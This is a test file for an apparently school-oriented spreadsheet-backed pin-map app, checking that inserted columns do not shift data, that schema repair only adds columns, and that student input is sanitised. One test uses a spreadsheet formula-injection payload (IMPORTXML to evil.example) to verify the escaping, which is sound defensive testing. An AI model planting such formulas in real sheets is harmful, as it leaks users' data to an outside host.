/**
 * sheet-schema.test.mjs — 「先生がシートを触る」を起こしても壊れないことの検査
 *
 * コンテナバインドで配ると、先生はスプレッドシートを直接開く。列を足す、
 * 誤字を直す、いらない行を消す。**それは事故ではなく起こる操作**なので、
 * ここでは実際にそれを起こして、次の 3 つを見る。
 *
 *   1. 列を挿されても、値が別の列に入らない（読みも書きも見出し名で解決する）
 *   2. 児童が書いた `=IMPORTXML(...)` が、先生がシートを開いた瞬間に実行されない
 *   3. 点検は「どこがどうずれているか」を言い、修整は**足すことしかしない**
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { loadGas, sheet, spreadsheet, parse } from './helpers/gas-sandbox.mjs';

const MEMBERS = ['email', 'displayName', 'role', 'status', 'number', 'groupId', 'joinedAt'];
const PINS = ['pin_id', 'unit_id', 'map_id', 'email', 'x', 'y', 'color', 'title', 'memo', 'image_url', 'created_at'];
const UNITS = ['unit_id', 'name', 'maps_json', 'chat_enabled', 'stamp_enabled', 'custom_stamps', 'is_active', 'created_at'];
const CHATS = ['chat_id', 'unit_id', 'email', 'message', 'target_type', 'target_id', 'created_at'];
const REACTIONS = ['reaction_id', 'unit_id', 'email', 'target_type', 'target_id', 'emoji', 'created_at'];

/** 一通りそろったクラス DB */
function classDb(overrides = {}) {
  return spreadsheet([
    overrides.members || sheet('Members', MEMBERS, []),
    sheet('Settings', ['key', 'value'], []),
    sheet('_Meta', ['key', 'value'], []),
    overrides.units || sheet('Units_単元', UNITS, []),
    overrides.pins || sheet('Pins_ピン', PINS, []),
    sheet('Chats_チャット', CHATS, []),
    sheet('Reactions_反応', REACTIONS, []),
    sheet('Images_画像', ['image_id', 'owner_email', 'created_at', 'chunk_count',
      'c1', 'c2', 'c3', 'c4', 'c5', 'c6', 'c7', 'c8', 'c9', 'c10'], [])
  ]);
}

test('列を 1 本挿されても、読みが別の列にずれない', () => {
  // 先生が Pins_ピン の 2 列目に「先生メモ」を挿した状態
  const pins = sheet('Pins_ピン',
    ['pin_id', '先生メモ', 'unit_id', 'map_id', 'email', 'x', 'y', 'color', 'title', 'memo', 'image_url', 'created_at'],
    [['pin_p000001', 'あとで見る', 'u1', 'm1', 'a@school.jp', 10, 20, '#f43f5e', 'ポスト', 'あかい', '', '2026-01-01']]);
  const ss = classDb({ pins });
  const { ctx } = loadGas({ ss });

  const rows = ctx.getTableData_(ss, ctx.TABLES.PINS);
  assert.equal(rows.length, 1);
  assert.equal(rows[0].title, 'ポスト');
  assert.equal(rows[0].memo, 'あかい');
  assert.equal(rows[0].email, 'a@school.jp');
  // 挿された列はアプリの読み出しに出てこない
  assert.equal(rows[0]['先生メモ'], undefined);
});

test('列を 1 本挿されても、書きが別の列に入らない', () => {
  const pins = sheet('Pins_ピン',
    ['pin_id', '先生メモ', 'unit_id', 'map_id', 'email', 'x', 'y', 'color', 'title', 'memo', 'image_url', 'created_at'],
    []);
  const ss = classDb({ pins });
  const { ctx } = loadGas({ ss });

  ctx.coreSavePin_(ss, 'a@school.jp', {
    pin_id: 'pin_000009', unit_id: 'u1', map_id: 'm1', x: 5, y: 6,
    color: '#0ea5e9', title: 'こうえん', memo: 'ひろい', image_url: ''
  });

  const sh = ss.getSheetByName('Pins_ピン');
  const row = sh.getRange(2, 1, 1, 12).getValues()[0];
  assert.equal(row[0], 'pin_000009');
  assert.equal(row[1], '');            // 先生メモの列は空のまま（アプリは触らない）
  assert.equal(row[2], 'u1');
  assert.equal(row[8], 'こうえん');     // title は「title」の列に入っている
  assert.equal(row[9], 'ひろい');
});

test('児童が書いた数式は、セルに入る前に無害化される', () => {
  const ss = classDb();
  const { ctx } = loadGas({ ss });

  ctx.coreSavePin_(ss, 'a@school.jp', {
    pin_id: 'pin_000001', unit_id: 'u1', map_id: 'm1', x: 1, y: 1, color: '#000',
    title: '=IMPORTXML("http://evil.example/"&A2,"//x")',
    memo: '+1+1', image_url: ''
  });
  ctx.coreSaveChat_(ss, 'a@school.jp', {
    chat_id: 'cht_000001', unit_id: 'u1', message: '@SUM(A1:A9)', target_type: 'general', target_id: ''
  });

  const pin = ctx.getTableData_(ss, ctx.TABLES.PINS)[0];
  const chat = ctx.getTableData_(ss, ctx.TABLES.CHATS)[0];
  assert.ok(String(pin.title).startsWith("'"), '数式のまま入っている: ' + pin.title);
  assert.ok(String(pin.memo).startsWith("'"));
  assert.ok(String(chat.message).startsWith("'"));
});

test('ふつうの文字には余計な記号を足さない', () => {
  const { ctx } = loadGas({});
  assert.equal(ctx.safeCellText_('こうえん'), 'こうえん');
  assert.equal(ctx.safeCellText_(''), '');
  assert.equal(ctx.safeCellText_(12), 12);
});

test('点検: そろっていれば何も言わない', () => {
  const ss = classDb();
  const { ctx } = loadGas({ ss });
  // vm の中で作られた配列は別 realm なので deepStrictEqual は使えない。件数で見る。
  assert.equal(ctx.checkSchema_(ss).length, 0, JSON.stringify(ctx.checkSchema_(ss)));
});

test('点検: シートが無い / 列が足りないを見つける', () => {
  const ss = spreadsheet([
    sheet('Members', ['email', 'displayName', 'role', 'status'], []),  // number 以降が無い
    sheet('Settings', ['key', 'value'], [])
  ]);
  const { ctx } = loadGas({ ss });
  const found = ctx.checkSchema_(ss);

  const kinds = found.map((f) => f.sheet + '/' + f.kind);
  assert.ok(kinds.includes('Members/列が足りない'), JSON.stringify(kinds));
  assert.ok(kinds.includes('Pins_ピン/シートが無い'), JSON.stringify(kinds));
  assert.ok(found.some((f) => f.blocking));
});

test('点検: 先生が足した列は「異常」ではなく「触らない」と言う', () => {
  const pins = sheet('Pins_ピン', PINS.concat(['先生メモ']), []);
  const ss = classDb({ pins });
  const { ctx } = loadGas({ ss });
  const found = ctx.checkSchema_(ss);
  const extra = found.filter((f) => f.kind === 'アプリが使わない列がある');
  assert.equal(extra.length, 1);
  assert.equal(extra[0].blocking, false);
  assert.equal(extra[0].fixable, false);
});

test('修整: 足りない列は「いちばん右」に足し、既存の列は 1 本も動かさない', () => {
  const members = sheet('Members', ['email', 'displayName', 'role', 'status', '先生メモ'],
    [['a@school.jp', 'あゆみ', 'student', 'active', 'メモ']]);
  const ss = spreadsheet([members,
    sheet('Settings', ['key', 'value'], []), sheet('_Meta', ['key', 'value'], []),
    sheet('Units_単元', UNITS, []), sheet('Pins_ピン', PINS, []),
    sheet('Chats_チャット', CHATS, []), sheet('Reactions_反応', REACTIONS, []),
    sheet('Images_画像', ['image_id', 'owner_email', 'created_at', 'chunk_count',
      'c1', 'c2', 'c3', 'c4', 'c5', 'c6', 'c7', 'c8', 'c9', 'c10'], [])]);
  const { ctx } = loadGas({ ss });

  const result = ctx.repairSchema_(ss);
  assert.ok(result.done.some((t) => t.includes('Members')), JSON.stringify(result));

  const header = members.getRange(1, 1, 1, members.getLastColumn()).getValues()[0];
  // 既存の 5 列はそのままの位置
  assert.deepEqual(header.slice(0, 5), ['email', 'displayName', 'role', 'status', '先生メモ']);
  // 足りなかった 3 列が右に付いている
  assert.deepEqual(header.slice(5), ['number', 'groupId', 'joinedAt']);
  // データ行は動いていない
  assert.deepEqual(members.getRange(2, 1, 1, 5).getValues()[0],
    ['a@school.jp', 'あゆみ', 'student', 'active', 'メモ']);
  // 直したあとは点検が通る
  assert.equal(ctx.checkSchema_(ss).filter((f) => f.blocking).length, 0);
});

test('修整: 見出しの行ごと消えているときは、見出しを書き戻さない', () => {
  // 1 行目がデータになっている（見出しの行が削除された状態）
  const members = sheet('Members',
    ['a@school.jp', 'あゆみ', 'student', 'active', '1', '', '2026-01-01'], []);
  const ss = spreadsheet([members, sheet('Settings', ['key', 'value'], [])]);
  const { ctx } = loadGas({ ss });

  const found = ctx.checkSchema_(ss);
  const bad = found.filter((f) => f.sheet === 'Members')[0];
  assert.equal(bad.kind, '見出しの行が見あたらない');
  assert.equal(bad.fixable, false, '自動で直してはいけない');

  const result = ctx.repairSchema_(ss);
  assert.ok(result.skipped.some((t) => t.includes('Members')), JSON.stringify(result));
  // 1 行目は 1 文字も変わっていない
  assert.deepEqual(members.getRange(1, 1, 1, 7).getValues()[0],
    ['a@school.jp', 'あゆみ', 'student', 'active', '1', '', '2026-01-01']);
});

test('修整: 見出しの表記ゆれはそろえるが、位置は動かさない', () => {
  const members = sheet('Members', [' email ', 'DisplayName', 'role', 'status', 'number', 'groupId', 'joinedAt'],
    [['a@school.jp', 'あゆみ', 'student', 'active', '1', '', '2026-01-01']]);
  const ss = spreadsheet([members,
    sheet('Settings', ['key', 'value'], []), sheet('_Meta', ['key', 'value'], []),
    sheet('Units_単元', UNITS, []), sheet('Pins_ピン', PINS, []),
    sheet('Chats_チャット', CHATS, []), sheet('Reactions_反応', REACTIONS, []),
    sheet('Images_画像', ['image_id', 'owner_email', 'created_at', 'chunk_count',
      'c1', 'c2', 'c3', 'c4', 'c5', 'c6', 'c7', 'c8', 'c9', 'c10'], [])]);
  const { ctx } = loadGas({ ss });

  // そろえる前から、読みは通っている（見出しは正規化して照合するため）
  assert.equal(ctx.getTableData_(ss, ctx.TABLES.MEMBERS)[0].displayName, 'あゆみ');

  ctx.repairSchema_(ss);
  assert.deepEqual(members.getRange(1, 1, 1, 7).getValues()[0],
    ['email', 'displayName', 'role', 'status', 'number', 'groupId', 'joinedAt']);
});

test('書けない列に書こうとしたら、推測で N 列目に入れず止まる', () => {
  const pins = sheet('Pins_ピン', ['pin_id', 'unit_id', 'map_id', 'email'], []);  // title 等が無い
  const ss = classDb({ pins });
  const { ctx } = loadGas({ ss });

  assert.throws(
    () => ctx.coreSavePin_(ss, 'a@school.jp', {
      pin_id: 'pin_000001', unit_id: 'u1', map_id: 'm1', x: 1, y: 1, color: '#000', title: 'あ', memo: '', image_url: ''
    }),
    /SHEET_BROKEN/
  );
});

test('単元の切り替えは is_active の列を見る（7 列目ではない）', () => {
  const units = sheet('Units_単元',
    ['unit_id', '先生メモ', 'name', 'maps_json', 'chat_enabled', 'stamp_enabled', 'custom_stamps', 'is_active', 'created_at'],
    [['u1', 'メモ', 'まちたんけん', '[]', true, true, '[]', true, '2026-01-01']]);
  const ss = classDb({ units });
  const { ctx } = loadGas({ ss });

  ctx.coreUnitAction_(ss, { action: 'save_unit', unit_id: 'unt_000002', name: 'こうつう', map_name: '基本マップ', map_url: '' });

  const rows = ctx.getTableData_(ss, ctx.TABLES.UNITS);
  assert.equal(rows.length, 2);
  assert.equal(rows[0].is_active, false, '前の単元が下ろされていない');
  assert.equal(rows[1].is_active, true);
  assert.equal(rows[1].name, 'こうつう');
  // 先生メモの列は 1 セルも触られていない
  assert.equal(units.getRange(2, 2).getValue(), 'メモ');
});
